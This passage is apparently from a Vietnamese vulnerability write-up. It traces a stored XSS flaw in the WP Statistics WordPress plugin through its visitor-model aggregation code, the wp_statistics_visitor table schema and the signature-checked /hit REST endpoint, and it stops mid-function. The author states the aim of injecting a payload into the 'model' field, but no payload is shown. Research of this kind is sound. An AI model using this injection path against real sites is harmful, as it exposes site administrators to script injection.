</span></span><span class="line"><span class="cl">    <span class="nv">$visitors</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visitorsModel</span><span class="o">-&gt;</span><span class="na">getVisitorsDevices</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$visitors</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$visitors</span> <span class="o">=</span> <span class="nx">array_reduce</span><span class="p">(</span><span class="nv">$visitors</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$carry</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Trim whitespace and default empty models to &#39;Unknown&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$model</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$item</span><span class="o">-&gt;</span><span class="na">model</span> <span class="o">??</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$model</span> <span class="o">===</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$model</span> <span class="o">=</span> <span class="s1">&#39;Unknown&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$carry</span><span class="p">[</span><span class="nv">$model</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$carry</span><span class="p">[</span><span class="nv">$model</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">visitors</span> <span class="o">+=</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">visitors</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$carry</span><span class="p">[</span><span class="nv">$model</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">object</span><span class="p">)[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;model&#39;</span>    <span class="o">=&gt;</span> <span class="nv">$model</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;visitors&#39;</span> <span class="o">=&gt;</span> <span class="nv">$item</span><span class="o">-&gt;</span><span class="na">visitors</span>
</span></span><span class="line"><span class="cl">                <span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$carry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="p">[]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;visitors&#39;</span> <span class="o">=&gt;</span> <span class="nv">$visitors</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;total&#39;</span>    <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visitorsModel</span><span class="o">-&gt;</span><span class="na">countColumnDistinct</span><span class="p">(</span><span class="nv">$args</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;visits&#39;</span>   <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visitorsModel</span><span class="o">-&gt;</span><span class="na">countColumnDistinct</span><span class="p">(</span><span class="nx">array_merge</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;field&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ID&#39;</span><span class="p">])),</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Ta focus vào <code>$visitors</code> vì nó được lặp và hiển thị ra HTML trong <code>models.php</code>{: .filepath}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;visitors&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="o">:</span> <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>$visitors</code> là kết quả trả về của hàm <code>getVisitorsDevices()</code> thuộc class <code>VisitorsModel</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getVisitorsDevices</span><span class="p">(</span><span class="nv">$args</span> <span class="o">=</span> <span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseArgs</span><span class="p">(</span><span class="nv">$args</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;field&#39;</span>          <span class="o">=&gt;</span> <span class="s1">&#39;agent&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;date&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;where_not_null&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;group_by&#39;</span>       <span class="o">=&gt;</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;order_by&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;visitors&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;order&#39;</span>          <span class="o">=&gt;</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;per_page&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page&#39;</span>           <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">Query</span><span class="o">::</span><span class="na">select</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;field&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;COUNT(visitor.ID) AS `visitors`&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">from</span><span class="p">(</span><span class="s1">&#39;visitor&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">whereDate</span><span class="p">(</span><span class="s1">&#39;last_counter&#39;</span><span class="p">,</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;date&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">whereNotNull</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;where_not_null&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">groupBy</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;group_by&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">orderBy</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;order_by&#39;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;order&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">perPage</span><span class="p">(</span><span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">[</span><span class="s1">&#39;per_page&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="o">-&gt;</span><span class="na">getAll</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span> <span class="o">?</span> <span class="nv">$result</span> <span class="o">:</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>getVisitorsDevices()</code> truy vấn <code>from('visitor')</code> cụ thể là bảng <code>wp_statistics_visitor</code> trong database rồi trả về kết quả.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Tables_in_wordpress</span><span class="w">                 </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------------------------+          
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">wp_statistics_visitor</span><span class="w">               </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">wp_other_table</span><span class="w">                      </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">wp_users</span><span class="w">                            </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">-------------------------------------+</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Bảng <code>wp_statistics_visitor</code> bao gồm các trường sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">desc</span><span class="w"> </span><span class="n">wp_statistics_visitor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------------+-----------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">Field</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="k">Type</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="k">Null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Key</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Default</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Extra</span><span class="w">          </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------------+-----------------+------+-----+---------+----------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">ID</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">PRI</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">auto_increment</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">last_counter</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="nb">date</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">referred</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">text</span><span class="w">            </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">agent</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">180</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">platform</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">180</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">version</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">180</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">device</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">180</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">model</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">180</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">UAString</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">190</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ip</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">location</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">MUL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">user_id</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="k">NO</span><span class="w">   </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">hits</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="nb">int</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">honeypot</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="nb">int</span><span class="w">             </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">city</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">region</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">continent</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">source_channel</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">source_name</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">first_page</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">first_view</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">datetime</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">last_page</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nb">bigint</span><span class="w"> </span><span class="n">unsigned</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">last_view</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">datetime</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="n">YES</span><span class="w">  </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="k">NULL</span><span class="w">    </span><span class="o">|</span><span class="w">                </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----------------+-----------------+------+-----+---------+----------------+</span></span></span></code></pre></td></tr></table>
</div>
</div><p>👉 Như vậy, <code>$data</code> là chứa kết quả trả về của truy vấn đến bảng <code>wp_statistics_visitor</code>(chứa <strong>model</strong> của <strong>visitor</strong>) và một số giá trị khác.
Ta cần tìm cách để lưu <strong>XSS payload</strong> vào trường <strong>model</strong> của <code>wp_statistics_visitor</code>.</p>
<p>May mắn thay, trong lúc chật vật với vị trí sink không chính xác lúc ban đầu, tôi đã tìm ra cách plugin lưu trữ thông tin của <strong>visitor</strong> vào <code>wp_statistics_visitor</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">register_rest_route</span><span class="p">(</span><span class="s1">&#39;wp-statistics/v2&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="s1">&#39;hit&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;methods&#39;</span>             <span class="o">=&gt;</span> <span class="nx">\WP_REST_Server</span><span class="o">::</span><span class="na">CREATABLE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;callback&#39;</span>            <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;hit_callback&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;args&#39;</span>                <span class="o">=&gt;</span> <span class="nx">self</span><span class="o">::</span><span class="na">require_params_hit</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="k">function</span> <span class="p">(</span><span class="nx">\WP_REST_Request</span> <span class="nv">$request</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkSignature</span><span class="p">(</span><span class="nv">$request</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">));</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Plugin đã đăng ký một <strong>REST API</strong> với endpoint <code>/wp-json/wp-statistics/v2/hit</code>, nhận <code>hit_callback()</code> làm callback.
Nhưng để sử dụng được endpoint này, cần phải vượt qua <code>checkSignature</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">checkSignature</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
